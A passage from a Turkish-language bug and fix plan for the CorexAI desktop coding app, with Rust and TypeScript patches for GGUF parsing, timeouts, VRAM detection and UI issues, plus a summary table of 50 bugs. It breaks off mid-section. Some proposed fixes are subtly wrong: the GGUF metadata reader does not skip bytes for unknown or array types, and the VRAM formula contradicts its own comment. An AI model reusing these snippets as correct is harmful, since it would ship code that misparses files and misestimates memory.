let parameters = if file_name.contains("3b") { "3B" }
    else if file_name.contains("7b") { "7B" }
    // ...
let quantization = if file_name.contains("q4_k_m") { "Q4_K_M" }
// ...
```

```rust
// ✅ YENİ KOD — GGUF magic bytes + header parse
use std::io::{Read, Seek, SeekFrom};
use std::fs::File;

#[tauri::command]
pub async fn read_gguf_metadata(path: String) -> Result<serde_json::Value, String> {
    let mut file = File::open(&path).map_err(|e| e.to_string())?;

    // GGUF magic: 0x47 0x47 0x55 0x46 ("GGUF")
    let mut magic = [0u8; 4];
    file.read_exact(&mut magic).map_err(|e| e.to_string())?;

    if &magic != b"GGUF" {
        return Err("Geçersiz GGUF dosyası (magic bytes yanlış)".to_string());
    }

    // Version (uint32 LE)
    let mut version_bytes = [0u8; 4];
    file.read_exact(&mut version_bytes).map_err(|e| e.to_string())?;
    let version = u32::from_le_bytes(version_bytes);

    // tensor_count (uint64 LE)
    let mut tc_bytes = [0u8; 8];
    file.read_exact(&mut tc_bytes).map_err(|e| e.to_string())?;
    let tensor_count = u64::from_le_bytes(tc_bytes);

    // metadata_kv_count (uint64 LE)
    let mut kvc_bytes = [0u8; 8];
    file.read_exact(&mut kvc_bytes).map_err(|e| e.to_string())?;
    let kv_count = u64::from_le_bytes(kvc_bytes);

    // Metadata key-value çiftlerini oku
    let mut metadata = serde_json::Map::new();
    metadata.insert("gguf_version".to_string(), version.into());
    metadata.insert("tensor_count".to_string(), tensor_count.into());

    for _ in 0..kv_count.min(200) { // max 200 KV oku
        // Key string: length (uint64) + bytes
        let key = read_gguf_string(&mut file)?;

        // Value type (uint32)
        let mut vtype_bytes = [0u8; 4];
        if file.read_exact(&mut vtype_bytes).is_err() { break; }
        let vtype = u32::from_le_bytes(vtype_bytes);

        let value = read_gguf_value(&mut file, vtype)?;
        metadata.insert(key, value);
    }

    // Dosya boyutunu ekle
    let file_size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    metadata.insert("file_size".to_string(), file_size.into());

    Ok(serde_json::Value::Object(metadata))
}

fn read_gguf_string(file: &mut File) -> Result<String, String> {
    let mut len_bytes = [0u8; 8];
    file.read_exact(&mut len_bytes).map_err(|e| e.to_string())?;
    let len = u64::from_le_bytes(len_bytes) as usize;
    if len > 4096 { return Err("String çok uzun".to_string()); }
    let mut buf = vec![0u8; len];
    file.read_exact(&mut buf).map_err(|e| e.to_string())?;
    String::from_utf8(buf).map_err(|e| e.to_string())
}

fn read_gguf_value(file: &mut File, vtype: u32) -> Result<serde_json::Value, String> {
    match vtype {
        0 => { // UINT8
            let mut b = [0u8; 1]; file.read_exact(&mut b).map_err(|e| e.to_string())?;
            Ok(b[0].into())
        }
        4 => { // UINT32
            let mut b = [0u8; 4]; file.read_exact(&mut b).map_err(|e| e.to_string())?;
            Ok(u32::from_le_bytes(b).into())
        }
        5 => { // INT32
            let mut b = [0u8; 4]; file.read_exact(&mut b).map_err(|e| e.to_string())?;
            Ok(i32::from_le_bytes(b).into())
        }
        6 => { // FLOAT32
            let mut b = [0u8; 4]; file.read_exact(&mut b).map_err(|e| e.to_string())?;
            Ok(f32::from_le_bytes(b).into())
        }
        7 => { // BOOL
            let mut b = [0u8; 1]; file.read_exact(&mut b).map_err(|e| e.to_string())?;
            Ok((b[0] != 0).into())
        }
        8 => { // STRING
            Ok(read_gguf_string(file)?.into())
        }
        10 => { // UINT64
            let mut b = [0u8; 8]; file.read_exact(&mut b).map_err(|e| e.to_string())?;
            Ok(u64::from_le_bytes(b).into())
        }
        _ => {
            // Bilinmeyen tip — atla (2 byte skip dene)
            Ok(serde_json::Value::Null)
        }
    }
}
```

---

### FIX-20 · sendToAI Yanlış Kullanım (editOrchestrator)
**Dosya:** `src/services/editOrchestrator.ts`
**Fonksiyon:** `generateEdits`

**Sorun:** `sendToAI(prompt, false)` — conversation history yok, plan context kaybolıyor.

```typescript
// ❌ MEVCUT KOD
const response = await sendToAI(prompt, false);
```

```typescript
// ✅ YENİ KOD
import { callAI } from './aiProvider';

private async generateEdits(request: EditRequest, plan: Plan): Promise<CodeAction[]> {
    const systemPrompt = `Sen bir kod düzenleme asistanısın. Verilen plana ve bağlama göre kod değişikliklerini tam olarak belirtilen formatta üret.

FORMAT:
ACTION: create|modify|delete
FILE: dosya/yolu.ts
CONTENT:
\`\`\`typescript
// kod buraya
\`\`\`
---`;

    const userPrompt = this.buildEditPrompt(request, plan);

    const response = await callAI(
        userPrompt,
        systemPrompt,  // system prompt olarak gönder
        []             // edit için fresh conversation
    );

    return this.parseCodeActions(response);
}
```

---

### FIX-21 · parseCodeActions Regex Çok Katı
**Dosya:** `src/services/editOrchestrator.ts`
**Fonksiyon:** `parseCodeActions`

**Sorun:** AI'nın tam belirli formatı üretmesi gerekiyor. En küçük sapma match olmuyor.

```typescript
// ❌ MEVCUT KOD — çok katı regex
const actionPattern = /ACTION:\s*(create|modify|delete)\s*\nFILE:\s*(.+?)\s*\nCONTENT:\s*```[\w]*\n([\s\S]*?)```/gi;
```

```typescript
// ✅ YENİ KOD — esnek regex + JSON fallback
private parseCodeActions(response: string): CodeAction[] {
    const actions: CodeAction[] = [];

    // 1. Esnek regex — boşluk ve satır sonu varyasyonlarını kabul et
    const actionPattern = /ACTION\s*:\s*(create|modify|delete)\s*[\r\n]+FILE\s*:\s*(.+?)\s*[\r\n]+CONTENT\s*:?\s*[\r\n]*```(?:\w+)?[\r\n]+([\s\S]*?)```/gi;

    let match;
    while ((match = actionPattern.exec(response)) !== null) {
        actions.push({
            type: match[1].toLowerCase() as 'create' | 'modify' | 'delete',
            filePath: match[2].trim(),
            content: match[3].trim(),
        });
    }

    // 2. JSON fallback — AI bazen JSON üretir
    if (actions.length === 0) {
        const jsonMatch = response.match(/\[\s*\{[\s\S]*?\}\s*\]/);
        if (jsonMatch) {
            try {
                const parsed = JSON.parse(jsonMatch[0]);
                for (const item of parsed) {
                    if (item.type && item.filePath) {
                        actions.push(item);
                    }
                }
            } catch { /* JSON parse başarısız */ }
        }
    }

    // 3. Son çare — kod bloklarını dosya adıyla eşleştir
    if (actions.length === 0 && this.lastPlan) {
        const codeBlocks = response.match(/```(?:\w+)?\n([\s\S]*?)```/g) || [];
        for (let i = 0; i < Math.min(codeBlocks.length, this.lastPlan.targetFiles.length); i++) {
            const content = codeBlocks[i].replace(/^```\w*\n/, '').replace(/```$/, '');
            actions.push({
                type: 'modify',
                filePath: this.lastPlan.targetFiles[i],
                content: content.trim(),
            });
        }
    }

    return actions;
}
```

---

## KATMAN 4 — KOD KALİTESİ (1-2 haftada)
*Performans, tekrar eden kod, iyileştirmeler.*

---

### FIX-22 · getAINativeStorageSize RAM İsrafı
**Dosya:** `src/services/aiNativeDB.ts`
**Fonksiyon:** `getAINativeStorageSize`

```typescript
// ❌ MEVCUT KOD — tüm DB RAM'e çekiyor
const fileAnalysis = await db.getAll('file_analysis');
return { file_analysis: JSON.stringify(fileAnalysis).length };
```

```typescript
// ✅ YENİ KOD — sadece count al
export async function getAINativeStorageSize(): Promise<Record<string, number>> {
    const db = await openDB();
    const stores = ['file_analysis', 'symbol_index', 'code_insights', 'file_history'];
    const result: Record<string, number> = {};

    for (const store of stores) {
        // count() çok daha hafif
        result[store] = await db.count(store);
    }

    return result;
}
```

---

### FIX-23 · Duplicate deleteCodeInsight Fonksiyonları
**Dosya:** `src/services/aiNativeDB.ts`

```typescript
// ❌ İKİSİ DE AYNI — birini sil
export async function deleteCodeInsight(insightId: string): Promise<void> { /* ... */ }
export async function deleteCodeInsights(insightId: string): Promise<void> { /* ... */ } // ← bu satırı sil
```

```typescript
// ✅ Sadece tekili tut, çoğulu sil. Çoğul bir array versiyonu olmalıydı:
export async function deleteCodeInsights(insightIds: string[]): Promise<void> {
    const db = await openDB();
    const tx = db.transaction('code_insights', 'readwrite');
    await Promise.all(insightIds.map(id => tx.store.delete(id)));
    await tx.done;
}
```

---

### FIX-24 · scrollToBottom Her Token'da Çağrılıyor
**Dosya:** `src/components/chatpanel.tsx`

```typescript
// ❌ MEVCUT KOD — streaming'de her token scroll
const handleStreamToken = (token: string) => {
    setMessages(prev => /* token ekle */);
    scrollToBottom(); // 100 token = 100 scroll = jank
};
```

```typescript
// ✅ YENİ KOD — throttle ile scroll
const scrollTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

const throttledScroll = useCallback(() => {
    if (scrollTimeoutRef.current) return; // zaten bekliyor
    scrollTimeoutRef.current = setTimeout(() => {
        scrollToBottom();
        scrollTimeoutRef.current = null;
    }, 100); // 100ms'de bir scroll
}, [scrollToBottom]);

const handleStreamToken = (token: string) => {
    setMessages(prev => /* token ekle */);
    throttledScroll(); // scroll yerine
};
```

---

### FIX-25 · GGUF Timeout Eksik
**Dosya:** `src/services/aiProvider.ts`
**Fonksiyon:** GGUF çağrısı

**Sorun:** Normal provider'da timeout var ama GGUF'ta yok. Model takılırsa sonsuza kadar bekler.

```typescript
// ✅ YENİ KOD — GGUF çağrısına timeout ekle
const GGUF_TIMEOUT_MS = 120_000; // 2 dakika

const ggufWithTimeout = async (params: any): Promise<string> => {
    const timeoutPromise = new Promise<never>((_, reject) => {
        setTimeout(() => reject(new Error('GGUF timeout (2 dakika)')), GGUF_TIMEOUT_MS);
    });

    return Promise.race([
        invoke<string>('chat_with_gguf_model', params),
        timeoutPromise
    ]);
};
```

---

### FIX-26 · unloadGgufModel Backend'i Kapatmamalı
**Dosya:** `src-tauri/src/gguf.rs`
**Fonksiyon:** `unload_gguf_model`

**Sorun:** Model unload edildiğinde backend de yıkılıyor. Sonraki model yüklemede pahalı CUDA reinit gerekiyor.

```rust
// ❌ MEVCUT KOD
state_guard.models.clear();
state_guard.backend = None;         // ← bunu kaldır
state_guard.backend_initialized = false; // ← bunu kaldır
```

```rust
// ✅ YENİ KOD — sadece modeli kaldır, backend koru
#[tauri::command]
pub async fn unload_gguf_model(
    state: tauri::State<'_, Arc<Mutex<GgufState>>>,
    model_path: Option<String>,
) -> Result<(), String> {
    let mut guard = state.lock().map_err(|e| e.to_string())?;
    match model_path {
        Some(path) => {
            guard.models.remove(&path);
            log::info!("✅ Model kaldırıldı: {}", path);
        }
        None => {
            guard.models.clear();
            log::info!("✅ Tüm modeller kaldırıldı");
        }
    }
    // backend ve backend_initialized değiştirilmiyor → hızlı yeniden yükleme
    Ok(())
}
```

---

### FIX-27 · detect_gpu_vram macOS/Linux Desteği
**Dosya:** `src-tauri/src/gguf.rs`
**Fonksiyon:** `detect_gpu_vram`

```rust
// ❌ MEVCUT KOD
fn detect_gpu_vram() -> f64 {
    if cfg!(target_os = "windows") {
        // nvidia-smi çalıştır
    }
    12.0 // macOS/Linux'ta hep 12GB!
}
```

```rust
// ✅ YENİ KOD
fn detect_gpu_vram() -> f64 {
    #[cfg(target_os = "windows")]
    {
        if let Ok(out) = std::process::Command::new("nvidia-smi")
            .args(["--query-gpu=memory.total", "--format=csv,noheader,nounits"])
            .output()
        {
            if let Ok(s) = std::str::from_utf8(&out.stdout) {
                if let Ok(mb) = s.trim().parse::<f64>() {
                    return mb / 1024.0;
                }
            }
        }
        // AMD Windows: rocm-smi dene
        if let Ok(out) = std::process::Command::new("rocm-smi")
            .args(["--showmeminfo", "vram"])
            .output()
        {
            // parse AMD output
        }
    }

    #[cfg(target_os = "linux")]
    {
        // NVIDIA
        if let Ok(out) = std::process::Command::new("nvidia-smi")
            .args(["--query-gpu=memory.total", "--format=csv,noheader,nounits"])
            .output()
        {
            if let Ok(s) = std::str::from_utf8(&out.stdout) {
                if let Ok(mb) = s.trim().parse::<f64>() { return mb / 1024.0; }
            }
        }
        // AMD: /sys/class/drm
        if let Ok(content) = std::fs::read_to_string(
            "/sys/class/drm/card0/device/mem_info_vram_total"
        ) {
            if let Ok(bytes) = content.trim().parse::<f64>() {
                return bytes / (1024.0 * 1024.0 * 1024.0);
            }
        }
    }

    #[cfg(target_os = "macos")]
    {
        // Apple Silicon: system_profiler
        if let Ok(out) = std::process::Command::new("system_profiler")
            .arg("SPDisplaysDataType")
            .output()
        {
            if let Ok(s) = std::str::from_utf8(&out.stdout) {
                // "Total Number of Cores: 30" → unified memory
                // macOS'ta GPU memory = sistem RAM paylaşımlı
                if let Ok(mem_out) = std::process::Command::new("sysctl")
                    .arg("hw.memsize").output()
                {
                    if let Ok(ms) = std::str::from_utf8(&mem_out.stdout) {
                        if let Some(val) = ms.split(':').nth(1) {
                            if let Ok(bytes) = val.trim().parse::<f64>() {
                                return (bytes / (1024.0 * 1024.0 * 1024.0)) * 0.75;
                            }
                        }
                    }
                }
            }
        }
    }

    // Fallback: bilinmiyor
    0.0
}
```

---

### FIX-28 · autonomy.ts Level 5 Asla Dönmüyor
**Dosya:** `src/services/autonomy.ts`
**Fonksiyon:** `calculateAutonomyLevel`

```typescript
// ❌ MEVCUT KOD — yorum Level 5 diyor ama kod 4 döndürüyor
if (contextLength >= 64000 && paramCount >= 13) {
    return 4; // ← 5 olmalı
}
```

```typescript
// ✅ YENİ KOD
if (contextLength >= 64000 && paramCount >= 13) {
    return 5; // Level 5: Autonomous — büyük modeller için
}
```

---

### FIX-29 · Duplicate API Endpoints — read_file ve read_file_content
**Dosya:** `src-tauri/src/commands.rs`

**Sorun:** `read_file` ve `read_file_content` tamamen aynı işi yapıyor. Kod tabanında ikisi de kullanılıyor.

```rust
// ✅ ÇÖZÜM — read_file'ı deprecated et, read_file_content'i standart yap
// read_file'ı sil ya da read_file_content'e yönlendir:
#[tauri::command]
pub async fn read_file(path: String) -> Result<String, String> {
    // Deprecated: read_file_content kullan
    read_file_content(path).await
}
```

---

### FIX-30 · GGUFModelBrowser useEffect Cleanup Sorunu
**Dosya:** `src/components/GGUFModelBrowser.tsx`
**Fonksiyon:** useEffect içindeki initDownloadManager

**Sorun:** Async cleanup dönüyor ama useEffect onu yakalamıyor. Listener sızdırılıyor.

```typescript
// ❌ MEVCUT KOD
useEffect(() => {
    const initDownloadManager = async () => {
        // ...
        return () => { unsubscribe(); }; // bu cleanup çalışmaz!
    };
    initDownloadManager(); // Promise ignore
}, []);
```

```typescript
// ✅ YENİ KOD
useEffect(() => {
    let unsubscribeFn: (() => void) | null = null;

    const init = async () => {
        const { downloadManager } = await import('../services/downloadManager');
        unsubscribeFn = downloadManager.onAnyTaskUpdate((task) => {
            setModels(prev => prev.map(model => {
                if (model.downloadUrl !== task.url) return model;
                return {
                    ...model,
                    isDownloading: task.status === 'downloading',
                    downloadProgress: task.progress,
                    isDownloaded: task.status === 'completed',
                    localPath: task.status === 'completed' ? task.destination : model.localPath,
                };
            }));
        });
    };

    init().catch(console.error);

    const interval = setInterval(updateGpuMemory, 3000);

    return () => {
        if (unsubscribeFn) unsubscribeFn(); // ← artık çalışır
        clearInterval(interval);
    };
}, []);
```

---

### FIX-31 · HF Arama Sıralı Fetch → Paralel
**Dosya:** `src/components/GGUFModelBrowser.tsx`

```typescript
// ❌ MEVCUT KOD — 20 sıralı istek = 10 saniye bekleme
for (const model of data) {
    const filesResponse = await fetch(`https://huggingface.co/api/models/${model.id}/tree/main`);
    // ...
}
```

```typescript
// ✅ YENİ KOD — paralel istek = ~1 saniye
const fileRequests = data.slice(0, 20).map(async (model) => {
    try {
        const res = await fetch(`https://huggingface.co/api/models/${model.id}/tree/main`);
        if (!res.ok) return null;
        const files = await res.json();
        return { model, files };
    } catch {
        return null;
    }
});

const results = await Promise.all(fileRequests);

for (const result of results) {
    if (!result) continue;
    const { model, files } = result;
    // ... model işleme mantığı
}
```

---

### FIX-32 · editorOverlay Dismiss Komutu Kayıtlı Değil
**Dosya:** `src/services/editorOverlay.ts`
**Fonksiyon:** constructor ve `formatHoverMessage`

```typescript
// ✅ YENİ KOD — komutu kaydet
constructor(editor: monaco.editor.IStandaloneCodeEditor) {
    this.editor = editor;
    this.loadDismissedInsights();
    this.registerHoverProvider();
    this.registerCodeActionProvider();
    this.registerCodeLensProvider();
    this.registerInlineCompletionProvider();
    this.registerDismissCommand(); // ← ekle
}

private registerDismissCommand(): void {
    // Monaco'ya dismiss komutunu kaydet
    this.editor.addCommand(
        monaco.KeyCode.Escape, // ya da özel komut
        () => { /* dismiss işlemi */ }
    );

    // Global komut registry'ye ekle
    (window as any).__corex_dismissInsight = (insightKey: string) => {
        this.dismissedInsights.add(insightKey);
        this.saveDismissedInsights();
        // Decorations'ı güncelle
        const filePath = insightKey.split(':')[0];
        const insights = backgroundReasoner.getInsights(filePath);
        this.updateDecorations(insights);
    };
}

// Hover message'da komut yerine window function kullan
private formatHoverMessage(insight: CodeInsight): string {
    const icon = insight.severity === 'error' ? '❌' : insight.severity === 'warning' ? '⚠️' : 'ℹ️';
    const key = this.getInsightKey(insight);
    return `${icon} **${insight.category}**: ${insight.message}` +
        `\n\n[Kapat](command:corex.dismissInsight?${encodeURIComponent(key)})`;
}
```

---

### FIX-33 · proactiveAssistant Priority 7 Hiç Gösterilmiyor
**Dosya:** `src/services/proactiveAssistant.ts`

**Sorun:** Double filter — priority 7 önce geçiriyor sonra medium olarak etiketlenip `high` filtresinde düşüyor.

```typescript
// ❌ MEVCUT KOD
.filter(gs => gs.priority >= 7)    // 7'yi geçir
.map(gs => {
    let priority = gs.priority >= 8 ? 'high' : 'medium'; // 7 → medium
    // ...
})
// analyzeProject'te:
.filter(s => s.priority === 'high') // 7'ler medium olduğu için düşüyor!
```

```typescript
// ✅ YENİ KOD — eşiği 8'e çek veya high sınırını 7'ye indir
.filter(gs => gs.priority >= 7)
.map(gs => {
    let priority: 'low' | 'medium' | 'high';
    if (gs.priority >= 7) priority = 'high';      // ← 7 de high
    else if (gs.priority >= 5) priority = 'medium';
    else priority = 'low';
    // ...
})
```

---

### FIX-34 · rag_pipeline.rs Türkçe Intent Desteği
**Dosya:** `src-tauri/src/rag_pipeline.rs`
**Fonksiyon:** `analyze_intent`

```rust
// ❌ MEVCUT KOD — sadece İngilizce
if query_lower.contains("refactor") { ... }
else if query_lower.contains("explain") || query_lower.contains("what is") { ... }
```

```rust
// ✅ YENİ KOD — Türkçe + İngilizce
pub fn analyze_intent(&self, query: &str) -> QueryIntent {
    let q = query.to_lowercase();

    let is_refactor = q.contains("refactor") || q.contains("yeniden düzenle")
        || q.contains("iyileştir") || q.contains("optimize");

    let is_explain = q.contains("explain") || q.contains("what is") || q.contains("what does")
        || q.contains("açıkla") || q.contains("nedir") || q.contains("ne yapar")
        || q.contains("anlat") || q.contains("göster");

    let is_debug = q.contains("debug") || q.contains("fix") || q.contains("error")
        || q.contains("hata") || q.contains("düzelt") || q.contains("sorun")
        || q.contains("neden çalışmıyor");

    let is_test = q.contains("test") || q.contains("unit test")
        || q.contains("birim test") || q.contains("test yaz");

    if is_refactor {
        QueryIntent::Refactor { symbol: self.extract_symbol_from_query(query) }
    } else if is_explain {
        QueryIntent::Explain { symbol: self.extract_symbol_from_query(query) }
    } else if is_debug {
        QueryIntent::Debug { file: self.extract_file_from_query(query) }
    } else if is_test {
        QueryIntent::Test { symbol: self.extract_symbol_from_query(query) }
    } else {
        QueryIntent::General
    }
}
```

---

### FIX-35 · modelRegistry VRAM Formülü 100× Düşük
**Dosya:** `src/services/modelRegistry.ts`
**Fonksiyon:** `calculateVRAMEstimates`

```typescript
// ❌ MEVCUT KOD — çok düşük tahmin
const contextOverhead = (contextLength / 1000) * parameters * 0.0001;
// 32K, 7B model için: 32 * 7 * 0.0001 = 0.022 GB (22MB) ← gerçek: ~2-3GB
```

```typescript
// ✅ YENİ KOD — gerçekçi KV cache formülü
function calculateVRAMEstimates(
    fileSizeGB: number, quantization: string,
    contextLength: number, parameters: number
): { min: number; recommended: number; withContext: number } {
    const baseVRAM = fileSizeGB;
    const quantMultiplier = getQuantizationMultiplier(quantization);

    // KV cache = 2 * num_layers * num_kv_heads * head_dim * context_length * bytes_per_element
    // Simplified: parameters_B * context_length * 0.0003 GB
    // 7B, 32K: 7 * 32 * 0.0003 = 0.067... bu da az
    // Gerçek kural: ~0.5GB per 1K context for 7B model
    const contextGB = (contextLength / 1000) * (parameters / 7.0) * 0.5;

    const min = Math.ceil(baseVRAM * quantMultiplier);
    const recommended = Math.ceil(baseVRAM * quantMultiplier * 1.15 + contextGB * 0.5);
    const withContext = Math.ceil(baseVRAM * quantMultiplier * 1.15 + contextGB);

    return { min, recommended, withContext };
}
```

---

### FIX-36 · git_log_file Proje Root'undan Çalışmıyor
**Dosya:** `src-tauri/src/commands.rs`
**Fonksiyon:** `git_log_file`

```rust
// ❌ MEVCUT KOD — current_dir eksik, binary'nin çalıştığı yerden git komutu
let output = Command::new("git")
    .args(["log", "--follow", "-p", "--", &file_path])
    .output()?;
```

```rust
// ✅ YENİ KOD — project_root parametresi ekle
#[tauri::command]
pub async fn git_log_file(
    file_path: String,
    project_root: String,  // ← ekle
) -> Result<Vec<GitCommit>, String> {
    let output = std::process::Command::new("git")
        .args(["log", "--follow", "--format=%H|%an|%ae|%at|%s", "--", &file_path])
        .current_dir(&project_root)  // ← proje root'undan çalıştır
        .output()
        .map_err(|e| e.to_string())?;
    // ...
}
```

---

### FIX-37 · core/planning/agent.ts Prompt İki Kez Gönderiliyor
**Dosya:** `src/core/planning/agent.ts`
**Fonksiyon:** `createPlan` ve `executeStep`

```typescript
// ❌ MEVCUT KOD — prompt hem 1. parametre hem history'de
const response = await callAI(prompt, '', [
    { role: 'user', content: prompt }  // prompt tekrarlanıyor
]);
```

```typescript
// ✅ YENİ KOD — sadece history'de
const response = await callAI('', systemContext, [
    { role: 'user', content: prompt }
]);
// veya
const response = await callAI(prompt, systemContext, []); // history boş, sadece mesaj
```

---

## ÖZET — TÜM HATALAR

| # | Dosya | Sorun | Seviye | Fix # |
|---|-------|-------|--------|-------|
| 1 | commands.rs | Terminal shell injection | 🔴 | FIX-01 |
| 2 | aiTools.ts | Shell injection | 🔴 | FIX-02 |
| 3 | executor.ts | Shell injection #3 | 🔴 | FIX-03 |
| 4 | ai.ts | eval() kullanımı | 🔴 | FIX-04 |
| 5 | auth.ts | Token localStorage'da | 🔴 | FIX-05 |
| 6 | Tüm proje | localStorage yerine Tauri Store | 🔴 | FIX-06 |
| 7 | vector_db.rs | SQL injection | 🔴 | FIX-07 |
| 8 | gguf.rs | Mutex tüm inference boyunca kilitli | 🔴 | FIX-08 |
| 9 | chatpanel.tsx | Dosya her mesajda diskten okunuyor | 🔴 | FIX-09 |
| 10 | aiProvider.ts | System instruction user mesajına ekleniyor | 🔴 | FIX-10 |
| 11 | aiNativeDB.ts | importedSymbols kaybolunca unused export analizi bozuluyor | 🔴 | FIX-11 |
| 12 | vector_db.rs | Double insert (yeni tabloda veri 2× yazılıyor) | 🔴 | FIX-12 |
| 13 | streaming.rs | HTTP streaming yanlış endpoint (/completions yerine /chat/completions) | 🔴 | FIX-13 |
| 14 | App.tsx | useEffect stale closure + callback birikimi | 🔴 | FIX-14 |
| 15 | useAIBackgroundAnalysis.ts | Queue sonraki dosyayı işlemiyor | 🔴 | FIX-15 |
| 16 | streaming.rs | GGUF streaming simüle ediliyor, gerçek değil | 🟡 | FIX-16 |
| 17 | rag_pipeline.rs | build_context tamamen TODO | 🟡 | FIX-17 |
| 18 | executor.ts | Validasyon sahte, hiçbir şey kontrol etmiyor | 🟡 | FIX-18 |
| 19 | gguf.rs | read_gguf_metadata dosya adından tahmin, binary okuma yok | 🟡 | FIX-19 |
| 20 | editOrchestrator.ts | sendToAI yanlış kullanım, system prompt yok | 🟡 | FIX-20 |
| 21 | editOrchestrator.ts | parseCodeActions regex çok katı | 🟡 | FIX-21 |
| 22 | aiNativeDB.ts | getAINativeStorageSize tüm DB'yi RAM'e çekiyor | 🟡 | FIX-22 |
| 23 | aiNativeDB.ts | deleteCodeInsight + deleteCodeInsights duplicate | 🟢 | FIX-23 |
| 24 | chatpanel.tsx | scrollToBottom her token'da çağrılıyor | 🟡 | FIX-24 |
| 25 | aiProvider.ts | GGUF için timeout yok | 🟡 | FIX-25 |
| 26 | gguf.rs | unloadGgufModel backend'i de kapatıyor | 🟡 | FIX-26 |
| 27 | gguf.rs | detect_gpu_vram macOS/Linux/AMD'yi desteklemiyor | 🟡 | FIX-27 |
| 28 | autonomy.ts | Level 5 hiç dönmüyor (kod 4 döndürüyor) | 🟡 | FIX-28 |
| 29 | commands.rs | read_file + read_file_content duplicate | 🟢 | FIX-29 |
| 30 | GGUFModelBrowser.tsx | useEffect async cleanup çalışmıyor | 🟡 | FIX-30 |
| 31 | GGUFModelBrowser.tsx | HF arama: 20 sıralı HTTP isteği = 10 saniye bekleme | 🟡 | FIX-31 |
| 32 | editorOverlay.ts | Dismiss komutu Monaco'ya kayıtlı değil | 🟡 | FIX-32 |
| 33 | proactiveAssistant.ts | Priority 7 hiç gösterilmiyor (double filter) | 🟡 | FIX-33 |
| 34 | rag_pipeline.rs | Intent analizi sadece İngilizce | 🟢 | FIX-34 |
| 35 | modelRegistry.ts | VRAM formülü 100× düşük tahmin | 🟡 | FIX-35 |
| 36 | commands.rs | git_log_file current_dir eksik | 🟡 | FIX-36 |
| 37 | core/planning/agent.ts | Prompt iki kez gönderiliyor | 🟢 | FIX-37 |
| 38 | gguf.rs | chat_with_gguf_vision TODO ama çağrılabilir, yanıltıcı UX | 🟡 | — |
| 39 | gguf.rs | Repetition penalty manuel O(n), kütüphane API'si kullanılmıyor | 🟢 | — |
| 40 | editOrchestrator.ts | selectContext'te _plan yoksayılıyor | 🟡 | — |
| 41 | aiNativeDB.ts | linesOfCode her zaman 0 (cache'den yüklenen projelerde) | 🟡 | FIX-11 (dahil) |
| 42 | autonomy.ts | localStorage bağımlılığı | 🔴 | FIX-06 (dahil) |
| 43 | GGUFModelBrowser.tsx | get_file_size komutu commands.rs'de yok | 🔴 | Yeni komut yaz |
| 44 | GGUFModelBrowser.tsx | window'a render sırasında yazma | 🟡 | FIX-30 (dahil) |
| 45 | modelRegistry.ts | calculateOptimalGPULayers sabit 33 layer | 🟡 | FIX-35 (dahil) |
| 46 | core/ai/manager.ts | regenerateResponse implement edilmemiş | 🟢 | — |
| 47 | chatpanel.tsx | handleSend debounce yok, çift tıklamada çift istek | 🟡 | — |
| 48 | ragService.ts | indexCommit'te filePath için commit hash kullanılıyor | 🟢 | — |
| 49 | planningAgent.ts | sendToAI conversation history olmadan çağrılıyor | 🟡 | — |
| 50 | scan_project | node_modules ignore edilmiyor (get_all_files'ta var ama scan_project'te yok) | 🟡 | — |

---

## UYGULAMA SIRASI (AI İçin)

### Aşama 1 — Güvenlik (önce bunları yap)
1. FIX-01: commands.rs → execute_terminal_command allowlist
2. FIX-02: aiTools.ts → runTerminal allowlist
3. FIX-03: executor.ts → executeCommand allowlist
4. FIX-04: ai.ts → eval() kaldır
5. FIX-05: auth.ts → Tauri Store
6. FIX-07: vector_db.rs → SQL injection

### Aşama 2 — Performans Blokajları
7. FIX-08: gguf.rs → Mutex inference öncesi bırak
8. FIX-09: chatpanel.tsx → dosya cache + boyut limiti
9. FIX-10: aiProvider.ts → system instruction system role'e taşı
10. FIX-11: aiNativeDB.ts → importedSymbols + linesOfCode düzelt
11. FIX-12: vector_db.rs → double insert düzelt
12. FIX-13: streaming.rs → /chat/completions
13. FIX-14: App.tsx → dependency array + cleanup
14. FIX-15: useAIBackgroundAnalysis.ts → queue fix

### Aşama 3 — Çalışmayan Özellikler
15. FIX-16: streaming.rs → gerçek streaming
16. FIX-17: rag_pipeline.rs → vector DB entegrasyonu
17. FIX-18: executor.ts → gerçek validasyon
18. FIX-19: gguf.rs → gerçek GGUF binary okuma
19. FIX-20 + FIX-21: editOrchestrator.ts → düzelt
20. FIX-06: localStorage → Tauri Store geçişi (büyük iş)

### Aşama 4 — Kalite İyileştirmeleri
21. FIX-22 → FIX-37 arası

---

*Bu belge CorexAI v0.1.0 analiz raporundan üretilmiştir. Faz 1, 2, 3 bulguları birleştirilmiştir.*
*AISettings.tsx ve WelcomeScreen.tsx analizi eksiktir — dosyalar henüz okunmadı.*

---

## EK KATMAN — AISettings.tsx & WelcomeScreen.tsx

---

### FIX-38 · AISettings — "Güvenli saklanır" Yazıyor Ama localStorage Kullanıyor
**Dosya:** `src/components/AISettings.tsx`
**Satır:** Footer ~son satır

**Sorun:** Footer'da `"API anahtarları güvenli şekilde saklanı"` yazıyor ama kod localStorage kullanıyor. Kullanıcıyı yanıltıyor.

```typescript
// ❌ MEVCUT KOD — footer'da yalan söylüyor
<div className="text-xs text-neutral-500">
  💡 Ayarlar otomatik kaydedilir • API anahtarları güvenli şekilde saklanı
</div>

// Ve aynı componentin useEffect'inde:
const savedProviders = localStorage.getItem('corex-ai-providers'); // API key burada!
localStorage.setItem('corex-ai-providers', JSON.stringify(newProviders)); // API key burada!
```

```typescript
// ✅ YENİ KOD — FIX-06'daki storage.ts'i kullan
// saveProviders fonksiyonunu async yap:
const saveProviders = async (newProviders: AIProvider[]) => {
    setProviders(newProviders);
    
    // API key'leri ayrı tut - hassas verileri güvenli store'a yaz
    const safeProviders = newProviders.map(p => ({
        ...p,
        apiKey: undefined // API key'i providers objesinden çıkar
    }));
    await storage.setSettings('corex-ai-providers', safeProviders);
    
    // API key'leri ayrı güvenli store'a yaz
    const keys: Record<string, string> = {};
    newProviders.forEach(p => { if (p.apiKey) keys[p.id] = p.apiKey; });
    await storage.setSecure('corex-ai-keys', keys);
    
    onProviderChange?.(newProviders);
    window.dispatchEvent(new CustomEvent('ai-providers-updated', { detail: newProviders }));
};

// Footer'ı da güncelle:
<div className="text-xs text-neutral-500">
  💡 Ayarlar otomatik kaydedilir • API anahtarları Tauri Store'da güvenli saklanır
</div>
```

---

### FIX-39 · AISettings — JSX İçinde console.log (Her Render'da Çalışıyor)
**Dosya:** `src/components/AISettings.tsx`
**Tab:** models tab, JSX return bloğu

